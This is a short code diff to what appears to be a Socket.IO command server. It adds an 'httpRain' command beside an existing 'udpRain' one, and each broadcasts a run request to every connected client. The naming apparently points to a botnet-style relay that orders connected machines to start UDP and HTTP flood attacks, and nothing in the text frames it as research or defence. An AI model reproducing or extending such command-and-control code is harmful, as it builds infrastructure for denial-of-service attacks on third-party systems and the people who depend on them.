@@ -55,6 +55,9 @@ io.on("connection", (socket) => {
     } else if (data.cmd.indexOf("udpRain") > -1) {
       console.log("udpRain triggered on server");
       io.emit("getRunRequest", data);
+    } else if (data.cmd.indexOf("httpRain") > -1) {
+      console.log("httpRain triggered on server");
+      io.emit("getRunRequest", data);
     } else {
       io.to(data.from).emit("getRunRequest", data);
     }
